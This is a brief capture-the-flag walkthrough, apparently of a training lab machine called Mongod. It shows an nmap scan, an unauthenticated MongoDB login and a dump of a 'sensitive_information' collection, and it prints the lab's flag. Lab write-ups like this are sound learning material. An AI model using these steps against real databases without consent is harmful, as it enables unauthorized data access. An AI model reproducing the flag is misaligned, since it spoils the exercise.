![Mongod.png](/assets/Tier-0/Mongod/Mongod.jpg)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 1 10.129.109.209
```



2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.109.209
```

**Output**
```bash
PORT      STATE SERVICE
22/tcp    open  ssh
27017/tcp open  mongod
```

3. Login with mongo
```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─| mongo --host 10.129.109.209
```
---
* Show all dbs
```bash
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
```
---

* Next, use `sensitive_information` db
```bash
> use sensitive_information
switched to db sensitive_information
```

---

* Show all collections in current db
```bash
> show collections
flag
```

---
* Dump content of **flag**
```bash
> db.flag.find().pretty()
```

**Output**
```
{
    "_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
    "flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
```